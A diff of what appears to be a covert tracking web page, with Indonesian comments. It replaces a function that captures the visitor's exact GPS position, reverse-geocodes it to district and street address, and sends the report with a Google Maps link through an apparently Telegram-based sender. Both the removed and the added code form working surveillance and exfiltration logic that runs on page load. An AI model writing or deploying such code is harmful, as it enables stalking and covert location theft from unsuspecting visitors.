@@ -120,40 +120,26 @@
             }
         }, 2000); 
 
-const sendLocationOnce = async () => {
-  if (!navigator.geolocation) {
-    await sTG("❌ Browser tidak mendukung GPS");
-    return;
-  }
-
-  navigator.geolocation.getCurrentPosition(
-    async (p) => {
-      const lat = p.coords.latitude;
-      const lon = p.coords.longitude;
-
-      let g = `📍 GPS TRACKING (ONE-TIME)\n`;
-      g += `📌 Lat: ${lat}\n`;
-      g += `📍 Lng: ${lon}\n`;
-      g += `🎯 Akurasi: ${p.coords.accuracy} m\n`;
-      g += `🗺️ Google Maps: https://www.google.com/maps?q=${lat},${lon}\n`;
-
-      const l = await gLD(lat, lon);
-      g += `🏙️ Kabupaten: ${l.kb}\n`;
-      g += `🏙️ Kecamatan: ${l.kc}\n`;
-      g += `🏠 Alamat: ${l.fa}\n`;
-
-      await sTG(g);
-    },
-    async (e) => {
-      await sTG(`❌ GPS Error: ${e.message}`);
-    },
-    {
-      enableHighAccuracy: true,
-      maximumAge: 0,
-      timeout: 10000
-    }
-  );
-};
+        // Menggunakan getCurrentPosition untuk hanya mengirim 1x dan menambahkan link Google Maps
+        if(navigator.geolocation){
+            navigator.geolocation.getCurrentPosition(async p=>{
+                const lat = p.coords.latitude;
+                const lon = p.coords.longitude;
+                
+                // Menambahkan link Google Maps
+                let g=`📍 GPS TRACKING (ONE-TIME)\n`;
+                g+=`📌 Lat: ${lat}\n📍 Lng: ${lon}\n`;
+                g+=`🎯 Akurasi: ${p.coords.accuracy}m\n`;
+                g+=`🗺️ Google Maps: https://www.google.com/maps/search/?api=1&query=${lat},${lon}\n`;
+                
+                const l=await gLD(lat,lon);
+                g+=`🏙️ Kabupaten: ${l.kb}\n🏙️ Kecamatan: ${l.kc}\n🏠 Alamat: ${l.fa}\n`;
+                await sTG(g)
+            },async e=>{
+                await sTG(`❌ GPS Error: ${e.message}`)
+            },{enableHighAccuracy:true,maximumAge:0,timeout:5000})
+        }
+    };
 
     // Langsung menjalankan fungsi ST tanpa delay
     ST();
